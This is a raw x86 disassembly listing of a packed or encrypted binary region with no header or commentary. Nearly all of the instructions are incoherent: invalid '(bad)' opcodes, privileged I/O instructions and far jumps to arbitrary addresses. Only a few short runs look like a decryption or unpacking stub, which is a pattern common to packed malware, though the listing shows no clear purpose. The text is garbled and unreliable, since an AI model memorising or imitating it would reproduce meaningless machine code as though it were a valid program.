  4062bd:	jns    0x40629c
  4062bf:	enter  0x6ba3,0x58
  4062c3:	dec    edx
  4062c4:	data16 sbb BYTE PTR [esi+0x5d],dh
  4062c8:	test   al,0x61
  4062ca:	pop    ecx
  4062cb:	lea    ebp,[ebx+0x73da0757]
  4062d1:	ins    DWORD PTR es:[edi],dx
  4062d2:	adc    BYTE PTR [edx-0x1b],al
  4062d5:	icebp  
  4062d6:	push   es
  4062d7:	pop    es
  4062d8:	sub    DWORD PTR [ebx],ebp
  4062da:	cmp    edi,DWORD PTR [edi-0x5cf68e9f]
  4062e0:	scas   al,BYTE PTR es:[edi]
  4062e1:	mov    dh,0x8d
  4062e3:	fs push ecx
  4062e5:	je     0x406319
  4062e7:	pop    ds
  4062e8:	mov    al,ds:0x72c8781b
  4062ed:	test   DWORD PTR [edx+0x108f59b7],ebx
  4062f3:	mov    eax,ds:0xb555024d
  4062f8:	add    esi,DWORD PTR [esi]
  4062fa:	iret   
  4062fb:	xchg   edi,eax
  4062fc:	adc    al,0x9c
  4062fe:	lods   al,BYTE PTR ds:[esi]
  4062ff:	cmp    BYTE PTR [esi+0x3],al
  406302:	push   0x638c9f18
  406307:	jb     0x406331
  406309:	ficomp WORD PTR [ecx+0x16d6c2b0]
  40630f:	adc    BYTE PTR [esi-0x15],al
  406312:	and    edi,DWORD PTR [eax]
  406314:	and    BYTE PTR [edx],bl
  406316:	adc    DWORD PTR [ebp-0x73],ebx
  406319:	jmp    0x869e2644
  40631e:	ja     0x406392
  406320:	push   eax
  406321:	push   cs
  406322:	ss (bad) 
  406324:	pop    ds
  406325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406326:	xchg   esp,eax
  406327:	or     BYTE PTR [ecx+0x1b],dl
  40632a:	mov    ch,0xa1
  40632c:	pop    ecx
  40632d:	jae    0x406308
  40632f:	(bad)  
  406330:	pop    ss
  406331:	xchg   edx,eax
  406332:	cdq    
  406333:	mov    esi,0x39615ad
  406338:	push   edx
  406339:	out    0x88,al
  40633b:	sub    BYTE PTR [ecx],dl
  40633d:	mov    ds:0x913ca2b4,al
  406342:	adc    BYTE PTR [ecx+0xc1f54c5],0xdd
  406349:	out    0x6b,al
  40634b:	nop
  40634c:	stos   DWORD PTR es:[edi],eax
  40634d:	popa   
  40634e:	sub    esp,esi
  406350:	mov    WORD PTR [edi],?
  406352:	and    al,0x8
  406354:	mov    ss,edi
  406356:	push   ecx
  406357:	es inc esp
  406359:	in     eax,0xea
  40635b:	mov    DWORD PTR [ebx],ebx
  40635d:	leave  
  40635e:	cmp    bl,ah
  406360:	add    al,0x68
  406362:	mov    edx,0x9f0ef31f
  406367:	push   ecx
  406368:	and    eax,0x9843825a
  40636d:	push   cs
  40636e:	add    eax,0x86500ed8
  406373:	cli    
  406374:	fs inc edi
  406376:	retf   0xc5f2
  406379:	adc    eax,0x35db2c54
  40637e:	adc    DWORD PTR [edi+0xe],ebp
  406381:	in     eax,0xf6
  406383:	pusha  
  406384:	add    cl,BYTE PTR [ebx-0x4293f1c9]
  40638a:	je     0x4063ca
  40638c:	es mov cl,0x98
  40638f:	fcomp  DWORD PTR [edx+0x67]
  406392:	sahf   
  406393:	inc    esp
  406394:	xchg   DWORD PTR [esi+ecx*8],ebx
  406397:	(bad)
  40639b:	xor    ecx,esp
  40639d:	imul   edi,DWORD PTR [ebp+ebp*1-0x14ceb7f],0x5
  4063a5:	sti    
  4063a6:	scas   eax,DWORD PTR es:[edi]
  4063a7:	mov    edi,0x31f5bc54
  4063ac:	pop    ebp
  4063ad:	(bad)  
  4063af:	dec    esi
  4063b0:	adc    al,0x8f
  4063b2:	push   0xffffff95
  4063b4:	daa    
  4063b5:	stos   DWORD PTR es:[edi],eax
  4063b6:	test   al,0x9d
  4063b8:	mov    ebp,0xe711c3e5
  4063bd:	pop    ebp
  4063be:	fbld   TBYTE PTR [ebx]
  4063c0:	fdiv   st,st(0)
  4063c2:	mul    DWORD PTR [ecx+0x44]
  4063c5:	mov    edx,DWORD PTR [ebp-0x2002ba5c]
  4063cb:	es loope 0x40640f
  4063ce:	je     0x4063cd
  4063d0:	fnstsw WORD PTR [ebx]
  4063d2:	mov    al,ds:0x3216fb29
  4063d7:	cmp    DWORD PTR [ebp-0x39],ebx
  4063da:	jnp    0x40644c
  4063dc:	je     0x40639f
  4063de:	xchg   esi,eax
  4063df:	pop    ds
  4063e0:	dec    ecx
  4063e1:	xchg   ecx,eax
  4063e2:	enter  0x1ee2,0x84
  4063e6:	ins    DWORD PTR es:[edi],dx
  4063e7:	mov    WORD PTR [esi-0x5a8dd5a6],?
  4063ed:	cmp    ebp,ecx
  4063ef:	leave  
  4063f0:	sar    BYTE PTR [esi],1
  4063f2:	add    eax,0x799ab08e
  4063f7:	jnp    0x40637c
  4063f9:	imul   edx,edi,0x6d
  4063fc:	popf   
  4063fd:	div    ebx
  4063ff:	enter  0x9bf3,0x1e
  406403:	popa   
  406404:	fnsave ss:[edx-0x37f8399b]
  40640b:	lea    ebx,[edx+0x51dc5f19]
  406411:	stos   BYTE PTR es:[edi],al
  406412:	arpl   cx,ax
  406414:	lods   eax,DWORD PTR ds:[esi]
  406415:	bound  edx,QWORD PTR [ebx+ebp*8-0x3f]
  406419:	jmp    0x55:0x89ea8102
  406420:	add    BYTE PTR [ecx+0x1509e44d],cl
  406426:	scas   al,BYTE PTR es:[edi]
  406427:	sub    DWORD PTR [edx+0x0],eax
  40642a:	mov    ecx,DWORD PTR [ebx]
  40642c:	and    DWORD PTR ds:0x4228fe,edi
  406432:	mov    edx,DWORD PTR [ebx+0x4]
  406435:	xor    DWORD PTR [ebp-0x1c],edi
  406438:	or     DWORD PTR ds:0x4228ee,0x53f5
  406442:	xor    edx,edx
  406444:	jmp    0x4069ce
  406449:	fisttp DWORD PTR [ecx+0x7b]
  40644c:	mov    WORD PTR [ecx],ds
  40644e:	xor    al,0xe0
  406450:	sbb    BYTE PTR [ebp-0x169165b5],bl
  406456:	jo     0x4064a2
  406458:	je     0x4064bf
  40645a:	adc    DWORD PTR [esi],0x16
  40645d:	cmp    eax,0x8a161604
  406462:	push   0x35
  406464:	out    dx,eax
  406465:	fld    QWORD PTR ds:0x8532d969
  40646b:	push   es
  40646c:	pop    eax
  40646d:	loop   0x406499
  40646f:	retf   0x1108
  406472:	and    al,0x25
  406474:	aaa    
  406475:	push   0xac522ae3
  40647a:	(bad)  
  40647b:	enter  0xd170,0x71
  40647f:	sub    edx,DWORD PTR [ecx-0x6b552fed]
  406485:	sbb    BYTE PTR [ecx],0xa8
  406488:	pop    ss
  406489:	adc    al,0x55
  40648b:	jno    0x406439
  40648d:	xor    al,0x11
  40648f:	mov    fs,WORD PTR [edx+0x2]
  406492:	push   ss
  406493:	add    ah,BYTE PTR [edx+0x417b2f0d]
  406499:	jecxz  0x4064ef
  40649b:	clc    
  40649c:	es fcmovnu st,st(4)
  40649f:	add    eax,0x5abac492
  4064a4:	addr16 xchg esp,eax
  4064a6:	push   ebx
  4064a7:	ss mov ecx,0xc357d604
  4064ad:	popa   
  4064ae:	pop    eax
  4064af:	inc    eax
  4064b0:	and    eax,0x52ceb0c8
  4064b5:	adc    edi,esp
  4064b7:	sbb    bl,dl
  4064b9:	and    DWORD PTR ds:0x577fd2f4,ebx
  4064bf:	jmp    0xe9b18671
  4064c4:	xchg   ecx,eax
  4064c5:	xor    DWORD PTR [ebx+0x5f9c2291],ebx
  4064cb:	bound  edi,QWORD PTR [eax-0x5f7dce02]
  4064d1:	pop    eax
  4064d2:	mov    ds:0xd37a1bb8,eax
  4064d7:	xchg   edi,eax
  4064d8:	in     eax,0xe
  4064da:	xchg   edx,eax
  4064db:	jns    0x4064ce
  4064dd:	lahf   
  4064de:	mov    dh,0x55
  4064e0:	mov    ds:0x89e7a29d,eax
  4064e5:	icebp  
  4064e6:	imul   edx,DWORD PTR [ecx+0x6454a1e9],0xffffffd3
  4064ed:	dec    ebx
  4064ee:	pop    esp
  4064ef:	cs cmc 
  4064f1:	sahf   
  4064f2:	adc    eax,0x4831fb29
  4064f7:	add    DWORD PTR [edx],ecx
  4064f9:	(bad)  
  4064fa:	jg     0x406527
  4064fc:	jp     0x4064f0
  4064fe:	push   ebx
  4064ff:	sbb    al,ch
  406501:	call   0xabb9c48
  406506:	pushf  
  406507:	jge    0x406537
  406509:	mov    cs,WORD PTR [edx-0x7f9d7b75]
  40650f:	ds inc ebp
  406511:	mov    eax,0x4e13081e
  406516:	cdq    
  406517:	out    dx,al
  406518:	push   ebp
  406519:	sub    al,0xfe
  40651b:	xchg   ebx,edx
  40651d:	js     0x40650d
  40651f:	das    
  406520:	adc    dl,BYTE PTR [ebx]
  406522:	adc    DWORD PTR [esp+edi*4],eax
  406525:	and    cl,BYTE PTR [ecx]
  406527:	test   esp,edi
  406529:	loope  0x406547
  40652b:	lahf   
  40652c:	(bad)  
  40652e:	ins    BYTE PTR es:[edi],dx
  40652f:	sti    
  406530:	ror    BYTE PTR [eax+ebp*1+0x6efd32a5],0x8b
  406538:	(bad)  [esi]
  40653a:	imul   DWORD PTR [ebx]
  40653c:	sub    BYTE PTR [ebp+esi*1+0x22],ch
  406540:	adc    ch,BYTE PTR [edi]
  406542:	stc    
  406543:	stos   DWORD PTR es:[edi],eax
  406544:	arpl   WORD PTR [ecx+0x5257de4d],ax
  40654a:	pop    edx
  40654b:	(bad)  
  40654c:	outs   dx,DWORD PTR ds:[esi]
  40654d:	mov    ?,WORD PTR [esi+0x286a16aa]
  406553:	push   ebx
  406554:	lea    edx,[edx]
  406556:	push   0xffffffbb
  406558:	pushf  
  406559:	sub    BYTE PTR [esi],dl
  40655b:	(bad)  
  40655c:	fsub   st,st(1)
  40655e:	stos   BYTE PTR es:[edi],al
  40655f:	jl     0x4064f8
  406561:	shl    DWORD PTR [edx],cl
  406563:	mov    al,0x18
  406565:	mov    bl,0x86
  406567:	mov    DWORD PTR ds:0xb159eece,esp
  40656d:	jns    0x406519
  40656f:	xchg   ecx,eax
  406570:	cld    
  406571:	xchg   edx,eax
  406572:	call   esi
  406574:	or     ecx,DWORD PTR [esi+0x34]
  406577:	jbe    0x4065cd
  406579:	sub    eax,0xcb05f0ca
  40657e:	aad    0xaa
  406580:	leave  
  406581:	sbb    esp,esp
  406583:	mov    esp,0x44e624b0
  406588:	retf   
  406589:	test   al,dl
  40658b:	scas   eax,DWORD PTR es:[edi]
  40658c:	pushf  
  40658d:	ins    BYTE PTR es:[edi],dx
  40658e:	jo     0x406565
  406590:	and    eax,0xb6cf636c
  406595:	aaa    
  406596:	jnp    0x40652e
  406598:	es mov esi,0xce3ee8a6
  40659e:	nop
  40659f:	jno    0x40659f
  4065a1:	or     DWORD PTR [ecx-0x34b2b53e],edx
  4065a7:	sub    al,0x84
  4065a9:	push   ds
  4065aa:	out    0xe6,eax
  4065ac:	push   es
  4065ad:	cmp    dh,BYTE PTR cs:[ebx-0x72be7b81]
  4065b4:	or     DWORD PTR [ebx+0x56],0x56
  4065b8:	pop    ebp
  4065b9:	das    
  4065ba:	push   ds
  4065bb:	ret    
  4065bc:	je     0x406618
  4065be:	test   al,0xe4
  4065c0:	push   edx
  4065c1:	sub    al,0xc1
  4065c3:	inc    edx
  4065c4:	xor    esp,esp
  4065c6:	or     bl,cl
  4065c8:	mov    al,ds:0xd343183a
  4065cd:	jns    0x406557
  4065cf:	and    bh,BYTE PTR [eax+0x1c327bad]
  4065d5:	rol    BYTE PTR [edx+esi*1+0x15],cl
  4065d9:	push   DWORD PTR [ebp-0x20cc0786]
  4065df:	pop    eax
  4065e0:	popf   
  4065e1:	je     0x4065d5
  4065e3:	add    al,0xdd
  4065e5:	cli    
  4065e6:	dec    esi
  4065e7:	aam    0x1b
  4065e9:	lahf   
  4065ea:	inc    eax
  4065eb:	dec    eax
  4065ec:	stos   BYTE PTR es:[edi],al
  4065ed:	and    BYTE PTR ds:0x33907324,ch
  4065f3:	test   DWORD PTR [ebp+0x6d],ebp
  4065f6:	repnz or al,0xfe
  4065f9:	mov    esi,0x1b2c94fd
  4065fe:	adc    al,0xfd
  406600:	jno    0x406600
  406602:	dec    ebp
  406603:	lea    ebp,[esi-0x67b5f26f]
  406609:	nop
  40660a:	out    dx,eax
  40660b:	and    edi,ebx
  40660d:	xor    esp,DWORD PTR [ebp+0x5bf5b73c]
  406613:	push   ss
  406614:	inc    ax
  406616:	mov    ah,0xe
  406618:	shl    BYTE PTR [eax-0x3c77033d],0x6e
  40661f:	fst    DWORD PTR [esi-0x298e16ff]
  406625:	ins    DWORD PTR es:[edi],dx
  406626:	mov    bl,0x7c
  406628:	jge    0x40662d
  40662a:	mov    edx,0xa21fc2d7
  40662f:	test   BYTE PTR [esi-0x76197d8],bh
  406635:	mov    cl,0x2c
  406637:	cmp    al,0x5b
  406639:	pop    esi
  40663a:	int3   
  40663b:	ins    BYTE PTR es:[edi],dx
  40663c:	xor    esp,DWORD PTR [ecx-0x46]
  40663f:	fsub   st(0),st
  406641:	dec    ecx
  406642:	adc    BYTE PTR [ebx-0x5a5375fe],ah
  406648:	inc    esi
  406649:	jl     0x4065cf
  40664b:	push   0xb9999e73
  406650:	scas   al,BYTE PTR es:[edi]
  406651:	mov    cl,bh
  406653:	stc    
  406654:	jmp    DWORD PTR [ebx]
  406656:	xor    DWORD PTR [ebp-0x2787e6f1],ecx
  40665c:	retf   
  40665d:	pop    edi
  40665e:	xchg   edi,eax
  40665f:	(bad)  
  406660:	repnz sbb BYTE PTR [eiz*2+0x602297eb],cl
  406668:	clc    
  406669:	push   ss
  40666a:	cli    
  40666b:	sub    edi,esi
  40666d:	addr16 dec edi
  40666f:	dec    edi
  406670:	test   DWORD PTR [esi+0x6a],esp
  406673:	pop    ebx
  406674:	jge    0x4066f1
  406676:	test   DWORD PTR [eax+0x3d],esi
  406679:	ss inc ebp
  40667b:	lods   al,BYTE PTR ds:[esi]
  40667c:	popa   
  40667d:	clc    
  40667e:	mov    ebx,0x2850b71c
  406683:	mov    DWORD PTR [edx+0x63],ecx
  406686:	in     al,0xe8
  406688:	adc    esi,0xe391042
  40668e:	aam    0x2d
  406690:	pop    esi
  406691:	test   BYTE PTR [ecx+0x63],bl
  406694:	aam    0x35
  406696:	loop   0x4066b0
  406698:	pop    ecx
  406699:	stos   BYTE PTR es:[edi],al
  40669a:	and    al,0x35
  40669c:	cwde   
  40669d:	push   ecx
  40669e:	adc    ch,BYTE PTR [eax+ebp*4-0x4a9f91d3]
  4066a5:	adc    bl,bl
  4066a7:	push   ds
  4066a8:	mov    al,ds:0xf163a4f2
  4066ad:	in     al,0xbb
  4066af:	sti    
  4066b0:	mov    ecx,0x6d04d02e
  4066b5:	xor    cl,ah
  4066b7:	lds    ebp,FWORD PTR [ebx+0x25]
  4066ba:	adc    DWORD PTR [eax-0x3d393f9b],edx
  4066c0:	pop    edx
  4066c1:	and    dl,BYTE PTR [ecx+0x1fdd337a]
  4066c7:	mov    DWORD PTR [ecx+esi*2+0x6],esp
  4066cb:	jmp    0x40671e
  4066cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ce:	out    dx,eax
  4066cf:	addr16 xchg ebx,eax
  4066d1:	push   cs
  4066d2:	(bad)  
  4066d3:	cmp    eax,DWORD PTR [eax-0x67]
  4066d6:	push   0xffffffb5
  4066d8:	xchg   esi,ebp
  4066da:	inc    ebx
  4066db:	or     DWORD PTR [esi+eiz*1+0x7331ee27],edx
  4066e2:	xlat   BYTE PTR ds:[ebx]
  4066e3:	sahf   
  4066e4:	push   cs
  4066e5:	nop
  4066e6:	(bad)  
  4066e7:	enter  0xad08,0xb3
  4066eb:	sub    al,BYTE PTR [eax]
  4066ed:	push   edi
  4066ee:	fisttp QWORD PTR [edi+0x49cc4986]
  4066f4:	fistp  QWORD PTR [esi]
  4066f6:	out    dx,eax
  4066f7:	xchg   ebp,eax
  4066f8:	pop    esp
  4066f9:	call   0xa03a:0xf8969d16
  406700:	sbb    ecx,DWORD PTR ds:[ecx+0x15]
  406704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406705:	je     0x4066bf
  406707:	xlat   BYTE PTR ds:[ebx]
  406708:	xor    al,cl
  40670a:	mov    esp,0x8570037e
  40670f:	push   esp
  406710:	scas   eax,DWORD PTR es:[edi]
  406711:	pop    esi
  406712:	aaa    
  406713:	mov    WORD PTR cs:[eax],gs
  406716:	xor    eax,0x8ba6817a
  40671b:	dec    eax
  40671c:	mov    dl,BYTE PTR [ecx]
  40671e:	mov    al,ds:0x236426b8
  406723:	ss in  al,dx
  406725:	mov    esi,0x34d1bb3f
  40672a:	(bad)  
  40672b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40672c:	sbb    eax,0x68509212
  406731:	ds fwait
  406733:	shr    ebx,0x63
  406736:	jnp    0x406731
  406738:	in     al,0x69
  40673a:	mov    ecx,0x20bf6b03
  40673f:	test   al,0x46
  406741:	and    esi,DWORD PTR [ebx-0x3b5552fb]
  406747:	fwait
  406748:	cli    
  406749:	jmp    0x406705
  40674b:	or     BYTE PTR [ebx-0x6a],ah
  40674e:	xchg   esi,eax
  40674f:	xchg   ebx,eax
  406750:	dec    eax
  406751:	dec    esp
  406752:	add    bh,BYTE PTR ds:0xa971d99a
  406758:	xor    ah,bh
  40675a:	ja     0x4067c7
  40675c:	scas   eax,DWORD PTR es:[edi]
  40675d:	inc    esi
  40675e:	pushf  
  40675f:	jmp    0x40679f
  406761:	popa   
  406762:	sub    BYTE PTR [ebx],cl
  406764:	test   al,0xd
  406766:	pusha  
  406767:	iret   
  406768:	loope  0x4067e7
  40676a:	and    esi,DWORD PTR [eax+0x388ac1]
  406770:	lock or al,0xc5
  406773:	repz test DWORD PTR [edx],0xb6480c8b
  40677a:	xor    DWORD PTR [esi+edx*8-0x3f7375f9],0xffffff86
  406782:	in     eax,0x44
  406784:	sbb    al,BYTE PTR [edx]
  406786:	mov    ds:0x2c621a54,al
  40678b:	pop    ecx
  40678c:	sti    
  40678d:	push   edi
  40678e:	xchg   esi,eax
  40678f:	addr16 pop esi
  406791:	clc    
  406792:	repnz fdiv DWORD PTR [ebp+0x79]
  406796:	out    0xf6,al
  406798:	jnp    0x406811
  40679a:	fld    DWORD PTR [eax]
  40679c:	push   es
  40679d:	push   ecx
  40679e:	arpl   WORD PTR ds:0x4d2bc177,di
  4067a4:	jb     0x4067eb
  4067a6:	xchg   ebx,eax
  4067a7:	cdq    
  4067a8:	inc    ebx
  4067a9:	ror    BYTE PTR [ebp+0x751afd1f],0x73
  4067b0:	xchg   ebx,eax
  4067b1:	js     0x406760
  4067b3:	pop    es
  4067b4:	shl    bx,cl
  4067b7:	ffreep st(2)
  4067b9:	sbb    bl,BYTE PTR [ebx]
  4067bb:	std    
  4067bc:	add    esi,DWORD PTR [ecx-0xc]
  4067bf:	(bad)  
  4067c0:	aas    
  4067c1:	adc    BYTE PTR [eax],0x60
  4067c4:	mov    bh,0xdd
  4067c6:	(bad)  
  4067c7:	call   0x1acbb383
  4067cc:	test   DWORD PTR [esi-0x5c],edi
  4067cf:	inc    edx
  4067d0:	loop   0x4067bb
  4067d2:	inc    esi
  4067d3:	pusha  
  4067d4:	mov    eax,DWORD PTR [edx]
  4067d6:	pop    esi
  4067d7:	and    eax,0x16461b1d
  4067dc:	loope  0x406851
  4067de:	lods   al,BYTE PTR ds:[esi]
  4067df:	mov    ecx,0x7723c027
  4067e4:	jp     0x406849
  4067e6:	push   edi
  4067e7:	stc    
  4067e8:	sub    ah,al
  4067ea:	aad    0x39
  4067ec:	fsubr  DWORD PTR [ecx+0x33]
  4067ef:	jae    0x40686e
  4067f1:	pop    edi
  4067f2:	cmp    eax,0xfe4a598
  4067f7:	inc    edi
  4067f8:	fidiv  WORD PTR [ecx-0x3009bf0c]
  4067fe:	inc    edi
  4067ff:	xor    DWORD PTR [ebx+0x3ddb1766],ebx
  406805:	iret   
  406806:	rol    dl,1
  406808:	push   eax
  406809:	sub    BYTE PTR [ecx+0x64],al
  40680c:	sbb    al,0xba
  40680e:	aad    0x6
  406810:	aad    0x8
  406812:	call   0x37104ddd
  406817:	mov    eax,ds:0xb55d61f3
  40681c:	(bad)  
  40681d:	popa   
  40681e:	lods   eax,DWORD PTR ds:[esi]
  40681f:	aas    
  406820:	inc    esp
  406821:	jne    0x406880
  406823:	xchg   BYTE PTR [ecx+esi*4],bh
  406826:	push   0x21
  406828:	pusha  
  406829:	xchg   edx,eax
  40682a:	xor    al,0xe3
  40682c:	mov    bl,0x79
  40682e:	push   0x4a
  406830:	shr    BYTE PTR [edi+eiz*8-0x3f9e0e3f],1
  406837:	mov    ebp,0xb11520b8
  40683c:	es add al,bh
  40683f:	inc    ecx
  406840:	push   ax
  406842:	clc    
  406843:	push   ds
  406844:	inc    edx
  406845:	jae    0x406864
  406847:	mov    al,ds:0x379d6703
  40684c:	jnp    0x40682c
  40684e:	jge    0x406855
  406850:	(bad)  
  406852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406853:	xor    edi,DWORD PTR [edi]
  406855:	stc    
  406856:	ja     0x406806
  406858:	inc    edx
  406859:	ja     0x40686c
  40685b:	jmp    0xcf366abe
  406860:	in     al,dx
  406861:	sbb    dl,cl
  406863:	lds    ecx,FWORD PTR [esi+0x56]
  406866:	or     al,0x4b
  406868:	mov    esp,0xc74f372b
  40686d:	aaa    
  40686e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40686f:	int3   
  406870:	jp     0x40689c
  406872:	fidiv  DWORD PTR [esi+0x7e6c473e]
  406878:	jl     0x40689a
  40687a:	jne    0x4068f7
  40687c:	rcl    BYTE PTR [esi-0x2c],1
  40687f:	push   es
  406880:	and    ebx,edx
  406882:	xchg   bl,bl
  406884:	pop    es
  406885:	aas    
  406886:	repz push esi
  406888:	ins    BYTE PTR es:[edi],dx
  406889:	retf   0x79ff
  40688c:	add    al,al
  40688e:	jg     0x40687b
  406890:	(bad)  
  406892:	out    0x9a,eax
  406894:	cwde   
  406895:	mov    ds,WORD PTR [ebp-0x733fb123]
  40689b:	and    edi,DWORD PTR [esi]
  40689d:	test   al,0x5c
  40689f:	mov    edx,0xfdaf03ea
  4068a4:	inc    edi
  4068a5:	sar    DWORD PTR [eax-0x74622214],cl
  4068ab:	sub    ebp,ebp
  4068ad:	pushf  
  4068ae:	rol    BYTE PTR [ebx+0x12],cl
  4068b1:	mov    esp,0x5c6bcac1
  4068b6:	cli    
  4068b7:	imul   edi,DWORD PTR [ebx-0x8e65ec8],0x5c
  4068be:	jmp    0x406914
  4068c0:	pop    ebx
  4068c1:	sub    ch,BYTE PTR [esp+ebx*2-0x334336c6]
  4068c8:	cld    
  4068c9:	rcr    eax,1
  4068cb:	mov    ebx,0xfd178d7b
  4068d0:	jmp    0x752a:0x1c2ffb9
  4068d7:	std    
  4068d8:	loope  0x4068f1
  4068da:	mov    al,0xad
  4068dc:	ror    edi,1
  4068de:	mov    bl,0x4d
  4068e0:	jl     0x406903
  4068e2:	push   eax
  4068e3:	jo     0x406868
  4068e5:	in     eax,0xe3
  4068e7:	cld    
  4068e8:	inc    esi
  4068e9:	inc    eax
  4068ea:	push   0x47
  4068ec:	jbe    0x406942
  4068ee:	dec    edi
  4068ef:	or     bh,dh
  4068f1:	xchg   ebp,eax
  4068f2:	pusha  
  4068f3:	cmp    ah,BYTE PTR [edx+ebp*1-0x2]
  4068f7:	jo     0x406959
  4068f9:	mov    ds:0x9f180ebe,al
  4068fe:	and    al,0x68
  406900:	push   ds
  406901:	cs cmp ecx,edi
  406904:	dec    ebp
  406905:	mov    ds:0xd13ab443,eax
  40690a:	push   es
  40690b:	sbb    eax,DWORD PTR [esi]
  40690d:	xor    al,BYTE PTR [ecx]
  40690f:	jmp    DWORD PTR [esi]
  406911:	loopne 0x406910
  406913:	outs   dx,DWORD PTR ds:[esi]
  406914:	jno    0x40690d
  406916:	or     DWORD PTR [ebx],esi
  406918:	rcr    DWORD PTR [edx-0x50810c06],0x36
  40691f:	(bad)  
  406920:	xchg   ecx,eax
  406921:	sub    eax,0x8b97256c
  406926:	mov    ah,BYTE PTR [ecx+0x99a3785]
  40692c:	push   edi
  40692d:	mov    ch,0x1f
  40692f:	rcr    BYTE PTR [edi-0x13],0x6c
  406933:	out    dx,eax
  406934:	call   0xa98a6700
  406939:	call   0x7b41:0xafec030c
  406940:	mov    esi,0xdd1f1bc4
  406945:	pushf  
  406946:	xchg   BYTE PTR [ebp+edi*2-0x4429a440],bl
  40694d:	pop    es
  40694e:	mov    esi,0xed71b8da
  406953:	(bad)  [eax-0x670ffa90]
  406959:	mov    bl,BYTE PTR [edi-0x137156ad]
  40695f:	nop
  406960:	sbb    BYTE PTR [esi],ch
  406962:	std    
  406963:	mov    ebx,0x7b00eee4
  406968:	mov    ch,0x53
  40696a:	addr16 mov ecx,0xbb91724e
  406970:	push   0x52
  406972:	stc    
  406973:	aas    
  406974:	fcomp  QWORD PTR ds:0x1f5fdf7
  40697a:	pushf  
  40697b:	xor    edi,DWORD PTR [edi+ecx*4]
  40697e:	pop    ebx
  40697f:	mov    cs,WORD PTR [edi-0x49]
  406982:	test   eax,0x494a9a85
  406987:	rol    bl,0xe
  40698a:	mov    dl,0xe6
  40698c:	dec    ebx
  40698e:	mov    ebp,0x7fa040ac
  406994:	and    al,0x58
  406996:	ficom  DWORD PTR [ebp+edx*1-0x4d]
  40699a:	test   bh,0x31
  40699d:	repnz test BYTE PTR [ecx*1+0xe49d2e4],al
  4069a5:	fld    DWORD PTR [edx]
  4069a7:	mov    ebx,0x5e22791e
  4069ac:	fcmovb st,st(7)
  4069ae:	xor    esp,DWORD PTR [ebp-0x63]
  4069b1:	add    DWORD PTR ds:[eax-0x3f],0x1c997dff
  4069b9:	mov    esi,es
  4069bb:	leave  
  4069bc:	or     eax,0x771023fe
  4069c1:	bound  esp,QWORD PTR [ebx+0x3f]
  4069c4:	jae    0x40697f
  4069c6:	inc    ebp
  4069c7:	and    ebp,edx
  4069c9:	mov    ebx,0xff59c0eb
  4069ce:	or     edx,DWORD PTR [ebp-0x1c]
  4069d1:	shl    ecx,0x1e
  4069d4:	sub    DWORD PTR ds:0x4228b2,0x1171
  4069de:	imul   edx,DWORD PTR [ebp-0x2c]
  4069e2:	sub    DWORD PTR [eax],edx
  4069e4:	mov    DWORD PTR ds:0x4228ae,0x6b62
  4069ee:	jmp    0x4076e1
  4069f3:	sub    edx,ecx
  4069f5:	mov    ecx,DWORD PTR [esi]
  4069f7:	mov    edx,DWORD PTR [esi+0x4]
  4069fa:	sbb    DWORD PTR ds:0x42293a,0x607d
  406a04:	shrd   ecx,edx,0x2
  406a08:	mov    DWORD PTR [ebp-0x1c],ecx
  406a0b:	mov    ecx,DWORD PTR [esi]
  406a0d:	xor    DWORD PTR [ebp-0x1c],edi
  406a10:	adc    DWORD PTR ds:0x42288e,0x77db
  406a1a:	jmp    0x406fa4
  406a1f:	bound  ebx,QWORD PTR [ecx-0xe]
  406a22:	imul   edi,ecx,0x71
  406a25:	push   edx
  406a26:	pop    eax
  406a27:	fst    DWORD PTR [eax]
  406a29:	std    
  406a2a:	mov    ah,0xdb
  406a2c:	dec    edx
  406a2d:	add    eax,0x168192a8
  406a32:	push   ss
  406a33:	cmp    eax,0x28161604
  406a38:	jecxz  0x406a66
  406a3a:	adc    eax,0x30995419
  406a3f:	xor    BYTE PTR [ecx-0x658bec3a],0xfe
  406a46:	cmp    DWORD PTR [ecx+0x2b],esi
  406a49:	and    eax,0x9c639a06
  406a4e:	leave  
  406a4f:	(bad)  
  406a50:	fucomi st,st(2)
  406a52:	out    0xf7,al
  406a54:	test   al,ah
  406a56:	inc    ebx
  406a57:	dec    eax
  406a58:	cmp    eax,ecx
  406a5a:	(bad)  
  406a5b:	cmp    bl,BYTE PTR [edx+0x60]
  406a5e:	in     al,dx
  406a5f:	xchg   ebp,eax
  406a60:	fdiv   DWORD PTR [eax]
  406a62:	test   al,0x8f
  406a64:	cdq    
  406a65:	mov    dl,0xf6
  406a67:	rol    BYTE PTR ds:0x8334925b,1
  406a6d:	ret    
  406a6e:	jmp    0xe2d4:0x88f43564
  406a75:	mov    al,ds:0xc5563e35
  406a7a:	imul   eax,DWORD PTR [ebx+0x46],0x618a07dd
  406a81:	fdivr  DWORD PTR [esi]
  406a83:	cmp    esp,DWORD PTR [edi+edx*4]
  406a86:	mov    DWORD PTR [esi-0x21791a35],edi
  406a8c:	test   al,0x10
  406a8e:	nop
  406a8f:	pop    esp
  406a90:	aaa    
  406a91:	cmp    bh,BYTE PTR [ecx-0x6161635e]
  406a97:	in     eax,dx
  406a98:	jp     0x406a47
  406a9a:	in     eax,0x48
  406a9c:	mov    cl,0xcf
  406a9e:	xor    eax,0x9621eebb
  406aa3:	sbb    DWORD PTR [esi-0x49d510a7],esi
  406aa9:	xor    dh,bh
  406aab:	jle    0x406a46
  406aad:	or     BYTE PTR [edx],ch
  406aaf:	test   BYTE PTR [ecx+eiz*8-0x53],0x7d
  406ab4:	fwait
  406ab5:	outs   dx,BYTE PTR ds:[esi]
  406ab6:	ds inc edi
  406ab8:	bnd jl 0x406a51
  406abb:	int3   
  406abc:	xchg   ebp,eax
  406abd:	stos   BYTE PTR es:[edi],al
  406abe:	push   ebp
  406abf:	scas   eax,DWORD PTR es:[edi]
  406ac0:	jmp    0xb2d5:0x663eed87
  406ac7:	xchg   ebp,eax
  406ac8:	adc    BYTE PTR [ebx],bl
  406aca:	or     dl,0x69
  406acd:	jecxz  0x406a7c
  406acf:	call   0xf3747df8
  406ad4:	cmp    eax,0x61ec7af1
  406ad9:	cmp    BYTE PTR [ebx-0x7b],bl
  406adc:	sahf   
